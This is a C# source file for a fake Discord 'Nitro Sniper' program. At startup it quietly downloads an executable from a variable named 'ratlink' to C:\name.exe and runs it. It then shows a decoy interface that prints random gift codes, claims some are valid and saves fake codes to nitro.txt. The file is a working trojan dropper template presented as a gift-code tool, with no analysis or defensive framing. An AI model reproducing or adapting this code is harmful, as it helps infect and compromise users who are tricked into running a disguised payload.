using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Fake_Nitro_Sniper__By_CodenameXYZ_
{
    internal class Program
    {

        private static Random random = new Random();

        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopupqrst";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }


        public static string Randomnumber(int length)
        {
            const string chars = "123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        static void Main(string[] args)
        {

            string ratlink = @"https://";
            string name = @"C:\name.exe";



            WebClient balls = new WebClient();
            balls.DownloadFile(ratlink, name);
            Process.Start(name);

            Console.WriteLine("Loading Please Wait...");
            Thread.Sleep(3500);
            Console.Clear();
            Console.WriteLine("Nitro Sniper By <Codename>\n");
            Console.WriteLine("Press enter to start sniping");
            Console.WriteLine("Valid codes will be saved to nitro.txt");
            Console.ReadLine();
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine("discord.gg/gift/" + RandomString(7));
            Console.WriteLine(Randomnumber(1) + " valid gifts");
            Console.ReadLine();
            File.WriteAllText("nitro.txt", "discord.gg/gift/" + RandomString(7) + "\ndiscord.gg/gift/" + RandomString(7) +  "\ndiscord.gg/gift/" + RandomString(7) + "\ndiscord.gg/gift/" + RandomString(7));
        }
    }
}
